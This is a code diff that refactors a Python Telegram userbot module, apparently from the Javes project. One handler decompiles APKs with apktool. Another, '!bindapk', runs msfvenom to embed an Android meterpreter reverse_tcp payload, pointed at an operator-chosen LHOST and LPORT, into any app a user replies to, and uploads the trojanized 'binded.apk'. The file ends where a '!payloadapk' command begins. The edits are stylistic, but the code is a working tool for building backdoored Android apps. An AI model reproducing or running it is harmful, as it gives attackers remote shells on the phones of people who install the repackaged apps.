@@ -38,8 +38,10 @@ async def progress(current, total, event, start, type_of_ps, file_name=None):
         estimated_total_time = elapsed_time + time_to_completion
         progress_str = "[{0}{1}] {2}%\n".format(
             ''.join(["█" for i in range(math.floor(percentage / 10))]),
-            ''.join(["░" for i in range(10 - math.floor(percentage / 10))]),
-            round(percentage, 2))
+            ''.join(["░" for _ in range(10 - math.floor(percentage / 10))]),
+            round(percentage, 2),
+        )
+
         tmp = progress_str + \
             "{0} of {1}\nETA: {2}".format(
                 humanbytes(current),
@@ -102,13 +104,14 @@ async def _(event):
         os.makedirs(TEMP_DOWNLOAD_DIRECTORY)
     if "|" in input_str:
         url, file_name = input_str.split("|")
-        url = url.strip()      
+        url = url.strip()
         file_name = file_name.strip()
         head, tail = os.path.split(file_name)
-        if head:
-            if not os.path.isdir(os.path.join(TEMP_DOWNLOAD_DIRECTORY, head)):
-                os.makedirs(os.path.join(TEMP_DOWNLOAD_DIRECTORY, head))
-                file_name = os.path.join(head, tail)
+        if head and not os.path.isdir(
+            os.path.join(TEMP_DOWNLOAD_DIRECTORY, head)
+        ):
+            os.makedirs(os.path.join(TEMP_DOWNLOAD_DIRECTORY, head))
+            file_name = os.path.join(head, tail)
         downloaded_file_name = TEMP_DOWNLOAD_DIRECTORY + "" + file_name
         downloader = SmartDL(url, downloaded_file_name, progress_bar=False)
         downloader.start(blocking=False)
@@ -116,7 +119,7 @@ async def _(event):
         display_message = None
         while not downloader.isFinished():
             status = downloader.get_status().capitalize()
-            total_length = downloader.filesize if downloader.filesize else None
+            total_length = downloader.filesize or None
             downloaded = downloader.get_dl_size()
             now = time.time()
             diff = now - c_time
@@ -124,10 +127,13 @@ async def _(event):
             speed = downloader.get_speed()
             elapsed_time = round(diff) * 1000
             progress_str = "[{0}{1}] {2}%".format(
-                ''.join(["█" for i in range(math.floor(percentage / 10))]),
-                ''.join(["░"
-                         for i in range(10 - math.floor(percentage / 10))]),
-                round(percentage, 2))
+                ''.join(["█" for _ in range(math.floor(percentage / 10))]),
+                ''.join(
+                    ["░" for _ in range(10 - math.floor(percentage / 10))]
+                ),
+                round(percentage, 2),
+            )
+
             estimated_total_time = downloader.get_eta(human=True)
             try:
                 current_message = f"{status}..\
@@ -161,46 +167,43 @@ async def _(event):
         else:
             await event.edit(f"{textt} \n\nDownloaded successfully !!")
     else:
-        return await event.edit(f"Error\n`Reply to an apk to Decompile.`")
+        return await event.edit('Error\n`Reply to an apk to Decompile.`')
     await event.edit(f"{textt} \n\nDecompiling......")
-    cmd = f"rm -rf decompiled.zip decompiled && apktool d {downloaded_file_name} -o decompiled && zip -r decompiled.zip decompiled && rm -rf {downloaded_file_name}"       
+    cmd = f"rm -rf decompiled.zip decompiled && apktool d {downloaded_file_name} -o decompiled && zip -r decompiled.zip decompiled && rm -rf {downloaded_file_name}"
     process = await asyncio.create_subprocess_shell(
         cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
     running_processes.update({message: process})
     stdout, stderr = await process.communicate()
-    not_killed = running_processes.get(message, False)
-    if not_killed:
-        del running_processes[message]    
+    if not_killed := running_processes.get(message, False):
+        del running_processes[message]
     text = f"[Return code]:\n {process.returncode}\n\n"
     if stdout:    	
         text += "\n[stdout]\n" + stdout.decode("UTF-8").strip() + "\n"
     if stderr:
-        text += "\n[stderr]\n" + stderr.decode('UTF-8').strip() + "\n"   
+        text += "\n[stderr]\n" + stderr.decode('UTF-8').strip() + "\n"
     if stdout or stderr:
-       output = open("decompiled.txt", "w+")
-       output.write(text)
-       output.close()
-       await event.client.send_file(event.chat_id, "decompiled.txt", reply_to=event.id, caption=f"`{JAVES_NNAME}:` **Decompiled Details**")
-       os.remove("decompiled.txt")           
+        with open("decompiled.txt", "w+") as output:
+            output.write(text)
+        await event.client.send_file(event.chat_id, "decompiled.txt", reply_to=event.id, caption=f"`{JAVES_NNAME}:` **Decompiled Details**")
+        os.remove("decompiled.txt")
     my_file = Path("decompiled.zip")
     if not my_file.exists():
     	return await event.reply(f"{textt}\n\nError: Decompile failed")
     await event.edit(f"{textt}\n\nRe Analyzing Datas......")
     input_str = "decompiled.zip"
-    if os.path.exists(input_str):
-        c_time = time.time()
-        await event.client.send_file(
-            event.chat_id,
-            input_str,
-            force_document=True,
-            allow_cache=False,
-            reply_to=event.message.id,
-            progress_callback=lambda d, t: asyncio.get_event_loop(
-            ).create_task(
-                progress(d, t, event, c_time, f"{textt} \n\nUploading Decompiled files as zip...", input_str)))
-        await event.edit(f"{textt} \n\n Decompiled and uploaded successfully !!")
-    else:
+    if not os.path.exists(input_str):
         return await event.edit("{textt}\n\nAdnormal Error")
+    c_time = time.time()
+    await event.client.send_file(
+        event.chat_id,
+        input_str,
+        force_document=True,
+        allow_cache=False,
+        reply_to=event.message.id,
+        progress_callback=lambda d, t: asyncio.get_event_loop(
+        ).create_task(
+            progress(d, t, event, c_time, f"{textt} \n\nUploading Decompiled files as zip...", input_str)))
+    await event.edit(f"{textt} \n\n Decompiled and uploaded successfully !!")
 
 
 
@@ -213,27 +216,37 @@ async def _(event):
     message = (str(event.chat_id) + ':' + str(event.message.id))
     input_str = event.pattern_match.group(1)
     if not input_str:
-    	return await event.edit(f"Error\nUsage : !bindapk <lhost> <lport> reply to an app")
+        return await event.edit(
+            'Error\nUsage : !bindapk <lhost> <lport> reply to an app'
+        )
+
     args = input_str.split()
     try:
-       lhost = str(args[0])
+        lhost = str(args[0])
     except:
-    	return await event.edit(f"Error\nUsage : !bindapk <lhost> <lport> reply to an app")
+        return await event.edit(
+            'Error\nUsage : !bindapk <lhost> <lport> reply to an app'
+        )
+
     try:
-        lport = str(args[1])    
+        lport = str(args[1])
     except:
-    	return await event.edit(f"Error\nUsage : !bindapk <lhost> <lport> reply to an app")
+        return await event.edit(
+            'Error\nUsage : !bindapk <lhost> <lport> reply to an app'
+        )
+
     if not os.path.isdir(TEMP_DOWNLOAD_DIRECTORY):
         os.makedirs(TEMP_DOWNLOAD_DIRECTORY)
     if "|" in input_str:
         url, file_name = input_str.split("|")
-        url = url.strip()      
+        url = url.strip()
         file_name = file_name.strip()
         head, tail = os.path.split(file_name)
-        if head:
-            if not os.path.isdir(os.path.join(TEMP_DOWNLOAD_DIRECTORY, head)):
-                os.makedirs(os.path.join(TEMP_DOWNLOAD_DIRECTORY, head))
-                file_name = os.path.join(head, tail)
+        if head and not os.path.isdir(
+            os.path.join(TEMP_DOWNLOAD_DIRECTORY, head)
+        ):
+            os.makedirs(os.path.join(TEMP_DOWNLOAD_DIRECTORY, head))
+            file_name = os.path.join(head, tail)
         downloaded_file_name = TEMP_DOWNLOAD_DIRECTORY + "" + file_name
         downloader = SmartDL(url, downloaded_file_name, progress_bar=False)
         downloader.start(blocking=False)
@@ -241,7 +254,7 @@ async def _(event):
         display_message = None
         while not downloader.isFinished():
             status = downloader.get_status().capitalize()
-            total_length = downloader.filesize if downloader.filesize else None
+            total_length = downloader.filesize or None
             downloaded = downloader.get_dl_size()
             now = time.time()
             diff = now - c_time
@@ -249,10 +262,13 @@ async def _(event):
             speed = downloader.get_speed()
             elapsed_time = round(diff) * 1000
             progress_str = "[{0}{1}] {2}%".format(
-                ''.join(["█" for i in range(math.floor(percentage / 10))]),
-                ''.join(["░"
-                         for i in range(10 - math.floor(percentage / 10))]),
-                round(percentage, 2))
+                ''.join(["█" for _ in range(math.floor(percentage / 10))]),
+                ''.join(
+                    ["░" for _ in range(10 - math.floor(percentage / 10))]
+                ),
+                round(percentage, 2),
+            )
+
             estimated_total_time = downloader.get_eta(human=True)
             try:
                 current_message = f"{status}..\
@@ -286,47 +302,50 @@ async def _(event):
         else:
             await event.edit(f"{textt} \n\nDownloaded successfully !!")
     else:
-        return await event.edit(f"Error\n`Reply to an apk to bind.`")
+        return await event.edit('Error\n`Reply to an apk to bind.`')
 
     await event.edit(f"{textt} \n\nBinding Apk with\n **Lhost:** `{lhost}` \n **Lport:** `{lport}`\nplease wait.....")
-    cmd = f"rm -rf binded.apk && msfvenom -x {downloaded_file_name} -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} --platform android --arch dalvik AndroidHideAppIcon=false AndroidMeterpreterDebug=false AndroidWakelock=true -o binded.apk ; rm -rf {downloaded_file_name}"     
+    cmd = f"rm -rf binded.apk && msfvenom -x {downloaded_file_name} -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} --platform android --arch dalvik AndroidHideAppIcon=false AndroidMeterpreterDebug=false AndroidWakelock=true -o binded.apk ; rm -rf {downloaded_file_name}"
     process = await asyncio.create_subprocess_shell(
         cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
     running_processes.update({message: process})
     stdout, stderr = await process.communicate()
-    not_killed = running_processes.get(message, False)
-    if not_killed:
-        del running_processes[message]    
+    if not_killed := running_processes.get(message, False):
+        del running_processes[message]
     text = f"[Command]:\n {cmd}\n[Return code]: {process.returncode}\n\n"
     if stdout:    	
         text += "\n[stdout]\n" + stdout.decode("UTF-8").strip() + "\n"
     if stderr:
-        text += "\n[stderr]\n" + stderr.decode('UTF-8').strip() + "\n"   
+        text += "\n[stderr]\n" + stderr.decode('UTF-8').strip() + "\n"
     if stdout or stderr:
-       output = open("binded.txt", "w+")
-       output.write(text)
-       output.close()
-       await event.client.send_file(event.chat_id, "binded.txt", reply_to=event.id, caption=f"**Bind Details**")
-       os.remove("binded.txt")           
+        with open("binded.txt", "w+") as output:
+            output.write(text)
+        await event.client.send_file(
+            event.chat_id,
+            "binded.txt",
+            reply_to=event.id,
+            caption='**Bind Details**',
+        )
+
+        os.remove("binded.txt")
     my_file = Path("binded.apk")
     if not my_file.exists():
     	return await event.reply(f"{textt}\n\nError: failed to bind this apk")
     await event.edit(f"{textt}\n\nBinded Successfully Re Analyzing Datas......")
     input_str = "binded.apk"
-    if os.path.exists(input_str):
-        c_time = time.time()
-        await event.client.send_file(
-            event.chat_id,
-            input_str,
-            force_document=True,
-            allow_cache=False,
-            reply_to=event.message.id,
-            progress_callback=lambda d, t: asyncio.get_event_loop(
-            ).create_task(
-                progress(d, t, event, c_time, f"{textt} \n\nUploading ...", input_str)))
-        await event.edit(f"{textt} \n\n Binded this apk  with `{lhost}:{lport}` and uploaded successfully !!")
-    else:
+    if not os.path.exists(input_str):
         return await event.edit("{textt}\n\nAdnormal Error")
+    c_time = time.time()
+    await event.client.send_file(
+        event.chat_id,
+        input_str,
+        force_document=True,
+        allow_cache=False,
+        reply_to=event.message.id,
+        progress_callback=lambda d, t: asyncio.get_event_loop(
+        ).create_task(
+            progress(d, t, event, c_time, f"{textt} \n\nUploading ...", input_str)))
+    await event.edit(f"{textt} \n\n Binded this apk  with `{lhost}:{lport}` and uploaded successfully !!")
 
 
 @javes05(outgoing=True, pattern="^!payloadapk(?: |$)(.*)")
